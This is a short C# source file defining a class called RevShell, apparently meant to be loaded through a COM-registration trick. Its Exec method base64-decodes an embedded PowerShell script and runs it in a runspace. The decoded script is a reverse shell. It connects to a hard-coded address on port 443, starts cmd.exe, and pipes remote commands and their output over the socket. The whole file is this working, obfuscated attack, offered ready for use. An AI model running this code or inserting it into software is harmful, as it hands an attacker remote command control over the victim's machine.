using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading.Tasks;

namespace ComRegister.RegClasses
{
    public static class RevShell
    {
        public static void Exec()
        {
            byte[] psrevshell = Convert.FromBase64String("ZnVuY3Rpb24gbWVzc3VwIHsNCmlmICgkY2xpZW50LkNvbm5lY3RlZCAtZXEgJHRydWUpIHskY2xpZW50LkNsb3NlKCl9DQppZiAoJHByb2Nlc3MuRXhpdENvZGUgLW5lICRudWxsKSB7JHByb2Nlc3MuQ2xvc2UoKX0NCmV4aXR9DQokYWRkcmVzcyA9ICcxOTIuMTY4LjEuNjgnDQokcG9ydCA9ICc0NDMnDQokY2xpZW50ID0gTmV3LU9iamVjdCBzeXN0ZW0ubmV0LnNvY2tldHMudGNwY2xpZW50DQokY2xpZW50LmNvbm5lY3QoJGFkZHJlc3MsJHBvcnQpDQokc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKQ0KJG5ldHdvcmtidWZmZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gJGNsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZQ0KJHByb2Nlc3MgPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzDQokcHJvY2Vzcy5TdGFydEluZm8uRmlsZU5hbWUgPSAnQzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhlJw0KJHByb2Nlc3MuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRJbnB1dCA9IDENCiRwcm9jZXNzLlN0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gMQ0KJHByb2Nlc3MuU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IDANCiRwcm9jZXNzLlN0YXJ0KCkNCiRpbnB1dHN0cmVhbSA9ICRwcm9jZXNzLlN0YW5kYXJkSW5wdXQNCiRvdXRwdXRzdHJlYW0gPSAkcHJvY2Vzcy5TdGFuZGFyZE91dHB1dA0KU3RhcnQtU2xlZXAgMQ0KJGVuY29kaW5nID0gbmV3LW9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nDQp3aGlsZSgkb3V0cHV0c3RyZWFtLlBlZWsoKSAtbmUgLTEpeyRvdXQgKz0gJGVuY29kaW5nLkdldFN0cmluZygkb3V0cHV0c3RyZWFtLlJlYWQoKSl9DQokc3RyZWFtLldyaXRlKCRlbmNvZGluZy5HZXRCeXRlcygkb3V0KSwwLCRvdXQuTGVuZ3RoKQ0KJG91dCA9ICRudWxsOyAkZG9uZSA9ICRmYWxzZTsgDQp3aGlsZSAoLW5vdCAkZG9uZSkgew0KaWYgKCRjbGllbnQuQ29ubmVjdGVkIC1uZSAkdHJ1ZSkge21lc3N1cH0NCiRwb3MgPSAwOyAkaSA9IDENCndoaWxlICgoJGkgLWd0IDApIC1hbmQgKCRwb3MgLWx0ICRuZXR3b3JrYnVmZmVyLkxlbmd0aCkpIHsNCiRyZWFkID0gJHN0cmVhbS5SZWFkKCRuZXR3b3JrYnVmZmVyLCRwb3MsJG5ldHdvcmtidWZmZXIuTGVuZ3RoIC0gJHBvcykNCiRwb3MrPSRyZWFkOyBpZiAoJHBvcyAtYW5kICgkbmV0d29ya2J1ZmZlclswLi4kKCRwb3MtMSldIC1jb250YWlucyAxMCkpIHticmVha319DQppZiAoJHBvcyAtZ3QgMCkgew0KJHN0cmluZyA9ICRlbmNvZGluZy5HZXRTdHJpbmcoJG5ldHdvcmtidWZmZXIsMCwkcG9zKQ0KJGlucHV0c3RyZWFtLndyaXRlKCRzdHJpbmcpDQpzdGFydC1zbGVlcCAxDQppZiAoJHByb2Nlc3MuRXhpdENvZGUgLW5lICRudWxsKSB7bWVzc3VwfQ0KZWxzZSB7DQokb3V0ID0gJGVuY29kaW5nLkdldFN0cmluZygkb3V0cHV0c3RyZWFtLlJlYWQoKSkNCndoaWxlKCRvdXRwdXRzdHJlYW0uUGVlaygpIC1uZSAtMSl7DQokb3V0ICs9ICRlbmNvZGluZy5HZXRTdHJpbmcoJG91dHB1dHN0cmVhbS5SZWFkKCkpOyBpZiAoJG91dCAtZXEgJHN0cmluZykgeyRvdXQgPSAnJ319DQokc3RyZWFtLldyaXRlKCRlbmNvZGluZy5HZXRCeXRlcygkb3V0KSwwLCRvdXQubGVuZ3RoKQ0KJG91dCA9ICRudWxsDQokc3RyaW5nID0gJG51bGx9fSBlbHNlIHttZXNzdXB9fQ==");
            string decodedString = Encoding.UTF8.GetString(psrevshell);
            Runspace rs = RunspaceFactory.CreateRunspace(); // create a runspace 
            rs.Open(); //open it
            Pipeline pipeline = rs.CreatePipeline(); // create a pipe line
            pipeline.Commands.AddScript(decodedString); // add ur script stored in script variable
            pipeline.Invoke(); //invokes the script and execute it
            rs.Close(); // close the runspace
        }

       
    }
}
